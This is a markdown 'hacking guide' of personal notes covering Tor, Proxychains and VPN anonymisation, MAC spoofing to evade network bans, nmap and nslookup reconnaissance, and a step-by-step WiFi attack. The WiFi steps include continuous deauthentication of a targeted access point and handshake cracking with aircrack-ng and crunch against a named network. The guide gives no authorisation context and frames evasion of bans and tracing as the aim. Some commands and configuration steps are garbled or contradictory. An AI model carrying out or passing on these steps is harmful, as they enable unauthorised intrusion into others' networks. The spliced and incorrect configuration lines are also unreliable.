# Hacking Guide

## Anonymity

Keep you anonymous is to hide your internet connection footprints. It means hide your IP, DNS, ISP providers and MAC address. You can do this by setting up Proxychains or a VPN. Changing your MAC address keeps you safe from being banned from local networks

- ### Proxies Chains

  Install **Proxychains** and **Tor**

  ```
  apt install tor
  apt install proxychainsn IP or IP Domain and DNS info.
  ```

  This will use tor to make a proxy path till your destination connection.

  Go to `/etc/proxychains.conf` and:<br>

  1. Comment `strict_chain` --> `# strict_chain`
  2. Uncomment `dynamic_chain` --> `# dynamic_chain`
  3. Make sure that the following lines are in the bottom of the document:

    ```
    # defaults set to "tor"
    socks4  127.0.0.1 9050
    socks4  127.0.0.1 9050
    ```

  4. Make sure that tor and proxychains services are running and start the program you want using proxychains.

    ```
    $ service tor start
    $ service proxychains start
    $ proxychains firefox
    ```

    **You are now anonymous.** Go to dnsleaktest.com to verify your anonymity.

  5. [OPTIONAL] If you don't want to use tor by adding your own proxies in the end of the file in the following pattern:

    ```
    type host port [user pass]

    Examples:

    socks5 192.168.67.78 1080 lamer secret
    ```

    **Always user socks5 proxies**

- ### VPN and DNS

  This will set an anonymous DNS and a VPN connection.

  1. Edit `/etc/dhcp/dhclient.conf` to change your DNS server.
  2. Find the line `#prepend domain-name-servers 127.0.0.1`
  3. Change the localhost IP address in the line for other open DNS servers IP. Put 3 separated by commas.
  4. It should look like

    ```
    prepend domain-name-servers 37.235.1.174, 37.235.1.177;
    ```

    **You need to look for DNS IP addresses that are free, open and don't keep logs**

  5. Run `$ service network-manager restart` to restart your internet.

  6. Run `$ cat /etc/resolv.conf` to check if the DNS are listed there.

  7. **Disable webrtc** on your browser. Just look for it on google.

  8. Find a reliable Open VPN provider and download a VPN from them. Don't forget to grab the user and password if needed. www.vpnbook.com is a good source.

  9. Make sure you have openvpn installed.

  10. Run `$ openvpn file_you_downloaded.ovpn`. It may require the user and password that the vpn provider you downloaded provided.

  11. Wait until you get the `Intialization Sequence Completed` on your terminal.<br>
    <br>
    **You are now anonymous.** Go to dnsleaktest.com to verify your anonymity.

- ### Change you MAC address

  The MAC address don't leave the local network and it is hard to get tracked from it. But, you do can be banned from a network by your MAC address, so being able to change it will prevent you from a complete ban.

  1. Make sure **macchanger** is installed.
  2. Run `$ macchanger -s interface` to show your current and permanent
  3. Run `$ macchanger --help` to the option to change the ip address

## NETWORK SCAN

- ### GET Domain IP or IP Domain and DNS info.

  ```
  $ nslookup domain
  $ nslookup IP
  ```

- ### Get system info.

  NMAP tool. `$ nmap --help` to see how it works.

  1. Get device MAC, open ports, OS and other info.
  2. Find devices in a IP range.
  3. Check <https://nmap.org/nsedoc/> to see available scripts.
  4. <https://exploit-db.com> is a good resouce for this kind of scripts too.

  <br>
  Awk and grep are very useful to handle output.<br>

- ### Get IP location

  Use ipinfo.io with curl. Maximum of 1000 queries/day.

  ```
  curl ipinfo.io/37.235.1.174
  ```

## Wireless Hacking

Do not use virtual machines for brute force and anything of a kind. Too slow.

- ### Necessary tools:

  1. **aircrack-ng**: wifi sniffer and key cracker.
  2. **reaver**: wifi pin cracker.
  3. **crunch**: password list generator.

- ### Hack wifi using aircrack-ng with crunch

  1. Setup wireless card to monitor mode:

    - Get the nanme of your wifi interface using `$ ifconfig`. Ex.: wlan0.
    - Shut it down. `$ ifconfig wlan0 down`.
    - Set the monitor mode. `$ iwconfig wlan0 mode monitor`.
    - Turn it back on. `$ ifconfig wlan0 up`.

  2. Kill running process that may interfere:

    - Check for process and ther PID. `$ airmon-ng check wlan0`
    - Kill all of them but in the order: NetworkManager, dhclient, then the rest. `$ kill pid`
    - Run `$ airmon-ng check wlan0` to make sure that nothing is running.

  3. Start a new interface to monitor. `$ airmon-ng start wlan0`.

  4. Use the new interface to monitor the wifi networks available. `$ airodump-ng mon0`.

  5. Select a network and monitor it. `$ airodump-ng -c [CHANNEL] -w [FILE] --bssid [MAC ADDRES] [INTERFACE]`.

    ```
    $ airodump-ng -c 10 -w SCAN_OUT --bssid 90:F6:52:D0:42:74 mon0
    ```

  6. Keep the step before running and force a new authentication by disconnecting a device. `$ aireplay-ng -0 0 -a [MAC] [INTERFACE]`

    ```
    aireplay-ng -0 0 -a 90:F6:52:D0:42:74 mon0
    ```

  7. Stop the programs that you started and crack the the results of it.

    - If you are going to use a dictionary file:

      ```
      $ aircrack-ng -w [word list file] SCAN_OUT
      ```

    - If you are going to use crunch do:

      ```
      $ crunch <min-len> <max-len> [<charset string>] | aircrack-ng -w - [SCAN OUT .cap FILE] -e [WIFI NETWOERK NAME]
      $ crunch 12 12 -t .%%%%Alegria 169 | aircrack-ng -w - SCAN-01.cap -e dgmelo
      ```



--------------------------------------------------------------------------------
